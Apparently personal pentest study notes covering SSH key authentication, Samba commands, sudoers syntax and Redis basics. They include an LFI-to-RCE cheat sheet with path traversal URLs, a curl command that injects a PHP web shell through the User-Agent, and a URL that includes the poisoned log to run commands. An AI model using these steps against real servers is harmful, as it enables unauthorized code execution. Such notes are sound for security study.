
# How SSH Key-Based Authentication Works
---

## Overview

SSH key-based authentication lets you log into a remote system **without a password**, using a **cryptographic key pair**:

- **Private Key** → stays on your machine
- **Public Key** → copied to the server (in `~/.ssh/authorized_keys`)

---

## Step-by-Step Authentication Process

### 1. Client Offers Key Type

The client begins the SSH connection and tells the server:
> "I want to authenticate using an `ssh-rsa` key."

---

### 2.  Server Checks `authorized_keys`

The server checks:

```
/home/<user>/.ssh/authorized_keys
```

It looks for a **matching public key**.

---

### 3.  Challenge–Response Authentication

- **Server** sends a random challenge (nonce)
- **Client** signs the challenge using their private key

---

### 4.  Server Verifies the Signature

- Using the public key from `authorized_keys`, the server checks:
  > "Did this private key really sign my challenge?"

 If the signature is valid → authentication **succeeds**  
 Otherwise → **access denied**

---

## What Goes in `~/.ssh/authorized_keys`

An example entry:

```
ssh-rsa AAAAB3... user@machine
```

- `ssh-rsa` → Key type
- `AAAAB3...` → Base64-encoded public key
- `user@machine` → Optional comment

-------------------------------------------------------------------
# What's SSH tunneling 




-----------------------------------------------------------------
# Samba 
Samba is a Linux/Unix implementation of the SMB/CIFS protocol that lets non‑Windows machines act as file‐ and print‐servers (or join Windows domains). At a high level:

## Services & Files  
- **Daemons**  
  - `smbd` – file/printer sharing  
  - `nmbd` – NetBIOS name service  
  - `winbindd` – AD user/group mapping  
- **Config**: `/etc/samba/smb.conf`  
- **Logs**: `/var/log/samba/`


## List shares: 
```bash
smbclient -L //<host> -U <user> 
```

## Mount shares:
```bash 
mount -t cifs //server/share /mnt \
  -o username=dora,password=Secret123
```

--------------------------------------------------------------

# LFI vs RFI
## LFI
    You can read arbitrary files (e.g. /etc/passwd).
    You may escalate to RCE by poisoning logs (e.g. access your PHP code into access.log and then include it).
    No direct outbound HTTP fetch is needed—everything is local.

## RFI
    The app fetches PHP code from your server and executes it immediately.
    You get straight up remote shell or backdoor.
    Modern PHP ships with allow_url_include=Off to block this by default.


# LFI → Log Poisoning → RCE Cheat Sheet

1. **Identify log file path**  
  Look at the config file before 
   ```bash
   # Try common Apache log locations via LFI
   http://TARGET/?something=../../../../../../var/log/apache2/access.log
   http://TARGET/?something=../../../../../../var/log/httpd/access_log
   ```
2. **Inject php code**
  ```bash 
  curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/
  ```
3. **Trigger LFI to include the poisoned log**
http://TARGET/image.php?img=../../../../../../var/log/apache2/access.log%00&cmd=id


----------------------------------
# The sudoers file 

Configuration file that defines who (which users or groups) is allowed to run what commands as which users (usually root), and how (with or without password). It’s parsed by the sudo command and controls all of sudo’s behavior.
User specifications
## Grant specific users or groups the ability to run commands as other users:
EXP:
user    host = (run-as) options: commands
alice     ALL  = (ALL)       ALL
bob       web  = (root)      NOPASSWD: /usr/bin/systemctl restart apache2
%admins    ALL = (ALL:ALL)   ALL

----------------------------------
# Redis Database 
Redis is an open‑source, in‑memory data store often used as a cache or simple database. At its core it holds keys and values (think of it like a really fast hash table).

## Key Concept
- Data store: You connect with redis-cli and can run commands like SET key value and GET key.
- Persistence: Even though it keeps data in memory, Redis can “dump” its state to disk (an RDB file) or append every write to a log (AOF).
- Replication: You can configure one Redis server to replicate another. The “slave” logs every write the “master” does.

